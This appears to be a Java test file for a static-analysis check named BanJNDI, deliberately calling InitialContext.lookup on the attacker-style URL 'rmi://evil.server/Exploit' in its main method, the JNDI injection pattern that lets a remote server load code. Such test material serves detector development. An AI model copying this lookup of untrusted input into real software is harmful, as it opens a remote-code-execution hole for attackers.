import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

class BanJNDIBug {

    // Function to determine if switch statement is reachable (always returns false)
    private boolean isReachable() {
        return false;
    }

    public String showBug(String jndiUrl) throws NamingException {
        // Unreachable switch statement
        switch (isReachable()? 1 : 0) {
            case 1:
                System.out.println("This line should not be executed!");
                break;
        }

        Context ctx = new InitialContext();
        Object object = ctx.lookup(jndiUrl); // BUG: BanJNDI
        return object.toString();
    }

    public static void main(String[] args) throws NamingException {
        BanJNDIBug bug = new BanJNDIBug();
        String userInput = "rmi://evil.server/Exploit";
        System.out.println(bug.showBug(userInput));
    }
}